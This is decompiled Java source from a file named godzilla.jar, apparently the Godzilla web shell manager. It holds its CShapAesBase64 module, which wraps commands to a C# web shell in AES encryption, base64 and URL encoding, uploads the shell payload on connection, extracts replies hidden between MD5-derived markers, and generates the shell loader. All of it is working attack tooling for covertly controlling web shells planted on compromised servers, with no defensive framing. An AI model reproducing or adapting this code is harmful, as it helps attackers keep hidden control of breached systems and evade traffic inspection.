/*     */ package shells.cryptions.cshapAes;
/*     */ 
/*     */ import core.annotation.CryptionAnnotation;
/*     */ import core.imp.Cryption;
/*     */ import core.shell.ShellEntity;
/*     */ import java.net.URLEncoder;
/*     */ import javax.crypto.Cipher;
/*     */ import javax.crypto.spec.IvParameterSpec;
/*     */ import javax.crypto.spec.SecretKeySpec;
/*     */ import util.Log;
/*     */ import util.functions;
/*     */ import util.http.Http;
/*     */ 
/*     */ 
/*     */ @CryptionAnnotation(Name = "CSHAP_AES_BASE64", payloadName = "CShapDynamicPayload")
/*     */ public class CShapAesBase64
/*     */   implements Cryption
/*     */ {
/*     */   private ShellEntity shell;
/*     */   private Http http;
/*     */   private Cipher decodeCipher;
/*     */   private Cipher encodeCipher;
/*     */   private String key;
/*     */   private boolean state;
/*     */   private byte[] payload;
/*     */   private String findStrLeft;
/*     */   private String pass;
/*     */   private String findStrRight;
/*     */   
/*     */   public void init(ShellEntity context) {
/*  31 */     this.shell = context;
/*  32 */     this.http = this.shell.getHttp();
/*  33 */     this.key = this.shell.getSecretKeyX();
/*  34 */     this.pass = this.shell.getPassword();
/*  35 */     String findStrMd5 = functions.md5(this.pass + this.key);
/*  36 */     this.findStrLeft = findStrMd5.substring(0, 16).toUpperCase();
/*  37 */     this.findStrRight = findStrMd5.substring(16).toUpperCase();
/*     */     try {
/*  39 */       this.encodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
/*  40 */       this.decodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
/*  41 */       this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
/*  42 */       this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
/*  43 */       this.payload = this.shell.getPayloadModule().getPayload();
/*  44 */       if (this.payload != null) {
/*  45 */         this.http.sendHttpResponse(this.payload);
/*  46 */         this.state = true;
/*     */       } else {
/*  48 */         Log.error("payload Is Null");
/*     */       }
/*     */     
/*  51 */     } catch (Exception e) {
/*  52 */       Log.error(e);
/*     */       return;
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] encode(byte[] data) {
/*     */     try {
/*  61 */       return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(data)))).getBytes();
/*  62 */     } catch (Exception e) {
/*  63 */       Log.error(e);
/*  64 */       return null;
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] decode(byte[] data) {
/*     */     try {
/*  72 */       data = functions.base64Decode(findStr(data));
/*  73 */       return this.decodeCipher.doFinal(data);
/*  74 */     } catch (Exception e) {
/*  75 */       Log.error(e);
/*  76 */       return null;
/*     */     } 
/*     */   }
/*     */   
/*     */   public String findStr(byte[] respResult) {
/*  81 */     String htmlString = new String(respResult);
/*  82 */     return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean isSendRLData() {
/*  89 */     return true;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean check() {
/*  97 */     return this.state;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] generate(String password, String secretKey) {
/* 103 */     return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\cshapAes\CShapAesBase64.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */